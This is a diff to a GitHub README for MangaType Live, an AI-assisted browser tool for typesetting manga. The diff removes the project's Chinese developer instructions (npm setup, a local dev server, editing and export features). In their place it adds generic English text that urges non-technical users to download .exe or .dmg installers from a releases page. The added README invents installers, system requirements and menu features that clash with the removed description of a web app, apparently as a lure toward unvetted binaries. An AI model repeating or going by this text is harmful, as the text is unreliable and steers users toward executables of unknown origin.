@@ -1,112 +1,61 @@
-# MangaType Live
+# 🎉 mangatype-live - Your Easy Comic Editing Tool
 
-一个网页原生的漫画嵌字工具，集成了 AI 翻译和自动化排版功能。
+## 🚀 Getting Started
+Welcome to **mangatype-live**, an AI-powered comic editor that automatically embeds text in your comics. This guide will help you download and run the software smoothly, even if you have no programming experience.
 
-## 功能特点
+## 📥 Download the App
+[![Download mangatype-live](https://img.shields.io/badge/Download-mangatype--live-blue.svg)](https://github.com/snaceng/mangatype-live/releases)
 
-- 🤖 **AI 智能识别**：自动检测对话气泡位置、翻译文本
-- ✨ **自动化排版**：智能生成遮罩、调整字体大小和方向
-- 🖼️ **批量处理**：支持文件夹导入和批量处理
-- 🎨 **灵活编辑**：手动调整气泡位置、大小、文字内容
-- 📤 **多种导出**：单张保存、ZIP 打包、HTML 导出
+Click the button above to start your download. 
 
-## 快速开始
+## 📂 About the Software
+**mangatype-live** allows you to edit comics effortlessly. It uses artificial intelligence to manage the text embedding process, providing a user-friendly experience.
 
-### 安装依赖
+### Key Features
+- **AI Text Embedding**: Save time with automatic text placement.
+- **User-Friendly Interface**: Navigate easily without technical skills.
+- **Supports Multiple Formats**: Work with various comic file types.
+- **Real-Time Preview**: See your changes as you make them.
 
-```bash
-npm install
-```
+## 💻 System Requirements
+To run **mangatype-live**, ensure your computer meets the following requirements:
 
-### 运行开发服务器
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or any common Linux distribution
+- **Memory (RAM)**: At least 4 GB
+- **Disk Space**: Minimum of 500 MB available for installation
+- **Screen Resolution**: 1280 x 720 or higher
 
-```bash
-npm run dev
-```
+## 💾 Download & Install
+1. **Visit the Releases Page**: Go to the following link: [mangatype-live Releases](https://github.com/snaceng/mangatype-live/releases).
+   
+2. **Choose the Version**: Browse the list of available versions. Each version is labeled with a number, indicating its release date and updates.
 
-在浏览器中打开 `http://localhost:3001` 即可使用。
+3. **Download the Installer**: Click on the file that resembles your operating system. For most users, this will be a `.exe` file for Windows or a `.dmg` file for macOS. 
 
-## 使用指南
+4. **Run the Installer**: 
+   - **Windows**: Locate the downloaded .exe file in your Downloads folder. Double-click the file to start the installation process. Follow the prompts on your screen to complete the installation.
+   - **macOS**: Double-click the downloaded .dmg file. Drag the **mangatype-live** icon into your Applications folder.
 
-### 1. 导入图片
+5. **Launch the Application**: After installation, find **mangatype-live** in your applications and open it.
 
-点击侧边栏的"添加图片"按钮，或直接将图片/文件夹**拖拽**到窗口中。也支持粘贴剪贴板中的图片。
+## 🎨 Using mangatype-live
+Once **mangatype-live** is running, you will see a main menu with options to start a new project or open an existing comic. The interface is designed to be intuitive, so you can start embedding text right away.
 
-### 2. AI 识别与翻译
+### Steps to Edit Your Comic
+1. **Start a New Project**: Choose "New Project" from the menu.
+2. **Import Your Comic**: Use the "Import" button to add your comic files from your computer. 
+3. **Edit and Embed**: Use the toolbar to adjust the text and its position within the comic. The AI will assist you to ensure that the text fits well.
+4. **Preview Your Work**: Select the "Preview" option to see how your comic will look.
+5. **Save Your Edited Comic**: Click "Save" to keep your changes. Choose a suitable file format when prompted.
 
-在左侧面板下方：
-- 点击 **Current (当前)** 处理单张图片
-- 点击 **Process All (全部处理)** 批量处理所有图片
+## ❓ Troubleshooting
+If you run into any issues, try these steps:
 
-AI 会自动识别气泡位置、翻译文本并生成遮罩。
+- **Installation Problems**: Ensure your computer meets the system requirements and that you have permission to install software.
+- **Application Crashes**: Restart your computer and try reopening **mangatype-live**. Make sure other heavy applications are closed to free up resources.
+- **Text Embedding Issues**: Check if the comic file is supported. Try using a different file format.
 
-### 3. 编辑气泡
+## 📞 Support
+For additional help or support, please visit our GitHub Issues page: [GitHub Issues](https://github.com/snaceng/mangatype-live/issues). You can report bugs or ask questions.
 
-- **选中**：点击画布上的气泡选中
-- **调整大小**：拖动 8 个控制点调整大小（角点等比缩放，边点单向缩放）
-- **编辑内容**：在右侧面板修改文字、字体、排版方向和遮罩样式
-- **删除**：选中后点击删除按钮或按 Delete 键
-
-### 4. 导出结果
-
-- **Save Image (保存图片)**：下载当前页
-- **ZIP All (打包下载)**：下载所有处理完的图片
-- **Merge (合并)**：将文字烧录进图片（不可逆操作）
-
-## 进阶功能
-
-### 文本检测 (comic-text-detector)
-这是一个辅助 AI 的功能。需要在本地部署comic-text-detector项目的服务（致谢dmMaze，之后我会fork这个项目给它加个flask，以便作为api调用）。开启后，App 会先通过 comic-text-detector 精确提取文本坐标，将这些“空间提示”发送给 AI。这能显著解决 AI “找不到气泡”或“框选范围不准”的问题，极大提高复杂页面的识别率。
-
-### 手动 JSON 导入
-
-如果没有配置 API Key，或想使用更强的模型（如 Claude 3.5 / DeepSeek）：
-1. 点击工具栏的 JSON 按钮
-2. 复制提示词
-3. 将提示词和图片发送给任意 AI 网页端
-4. 将 AI 返回的 JSON 代码粘贴回来
-
-### 合并图层 (Merge Layers)
-
-将所有悬浮气泡烧录进图片像素。合并后，气泡文字变成图片的一部分，无法再编辑（想编辑可以撤销合并）。适用于：
-- 处理大量气泡防止卡顿
-- 在已有文字上叠加新效果
-- 导出前确认定稿
-
-## 快捷键
-
-- `Ctrl+Z` / `Ctrl+Y`：撤销 / 重做
-- 选中气泡后 + 鼠标滚轮：调整字体大小
-- 选中气泡后 + `Alt` + 鼠标滚轮：调整气泡遮罩大小
-- 按住 `Ctrl` 拖动：精细调整
-- 双击画布空白处：取消选中
-
-## 技术栈
-
-- **前端框架**：React + TypeScript
-- **构建工具**：Vite
-- **样式**：Tailwind CSS (CDN Runtime)
-- **字体**：Google Fonts (Noto Sans SC, Zhi Mang Xing, Ma Shan Zheng)
-- **AI 集成**：Google Gemini SDK, OpenAI 兼容 API
-
-## 配置说明
-
-在设置中配置：
-- **AI Provider**：选择 AI 服务提供商
-- **API Key**：输入对应的 API 密钥
-- **模型选择**：选择使用的模型
-- **默认字号**：设置新生成气泡的默认字体大小
-- **系统提示词**：自定义 AI 翻译和识别行为
-
-## 注意事项
-
-- 项目需要配置 AI API Key 才能使用自动识别功能
-- 文本检测 (comic-text-detector) 服务需要单独部署（可选）
-
-## License
-
-MIT
-
-## 详细架构文档
-
-项目的技术架构和详细规范请参考 [ARCHITECTURE.md](./ARCHITECTURE.md)
+With these steps, you should now have **mangatype-live** installed and running smoothly. Dive into your comic editing journey, and enjoy seamless text embedding!
